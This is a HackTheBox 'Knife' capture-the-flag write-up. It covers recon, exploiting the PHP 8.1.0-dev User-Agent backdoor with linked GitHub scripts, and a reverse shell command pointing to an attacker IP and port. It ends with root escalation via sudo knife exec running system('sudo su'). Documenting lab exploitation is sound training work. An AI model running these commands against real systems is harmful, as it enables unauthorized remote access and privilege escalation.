
# HTB Knife Writeup

First, add your IP to `/etc/hosts` to make the target accessible while conducting scans.

## Reconnaissance

`sudo nmap -sV -sC knife.htb`

![[HackTheBox/Knife/images/1.png]]

Let's check port 80 to see whether there is an application or any static page available.

![[HackTheBox/Knife/images/2.png]]

Begin to fuzz; I prefer `gobuster`. No juicy results appeared.

![[HackTheBox/Knife/images/3.png]]

Therefore, I also wanted to analyze requests/responses through `Burp Suite` since there were no clues on both the web surface and the network side.

![[HackTheBox/Knife/images/4.png]]

## Exploitation

An RCE vulnerability was found particularly on this PHP version.

`PHP/8.1.0-dev`

![[HackTheBox/Knife/images/5.png]]

I found a repository containing a direct RCE exploit via GitHub.

[RCE on User-Agent](https://github.com/fahmifj/php-8.1.0-dev-zerodium-rce)

Let's run it:

`chmod +x php-8.1.0-dev-zerodiumRCE.py`
`./php-8.1.0-dev-zerodiumRCE.py [url]`

Got a shell directly:

![[HackTheBox/Knife/images/6.png]]

Found the user flag under the `/home/james/` directory.

![[HackTheBox/Knife/images/7.png]]

## Privilege Escalation

Upgrade user to root:

![[HackTheBox/Knife/images/10.png]]

Observed that the user can run the `knife` command with root privileges.

![[HackTheBox/Knife/images/8.png]]

The previous exploit did not provide a stable reverse shell, so I switched to this one:

[Reverse Shell Exploit](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py)

Simply run the exploit. Some exploits support `-h` and direct run as guidance. Now use the entire command:

`python shell.py http://knife.htb 10.10.14.50 4444`

![[HackTheBox/Knife/images/9.png]]

Check the usage of the `knife` command:

[Knife Manual](https://docs.chef.io/workstation/knife_exec/)

The `knife` command's `-E` parameter supports the Ruby language, so I began searching for how to execute terminal commands via Ruby.

![[HackTheBox/Knife/images/11.png]]

A Stack Overflow topic suggests that `system('ls')` works for such operations.

![[HackTheBox/Knife/images/12.png]]

`sudo /usr/bin/knife exec -E "system('ls')"`

![[HackTheBox/Knife/images/13.png]]

Now let's become root:

`sudo /usr/bin/knife exec -E "system('sudo su')"`

![[HackTheBox/Knife/images/14.png]]

Got the root flag from `/root/` and done!

![[HackTheBox/Knife/images/15.png]]
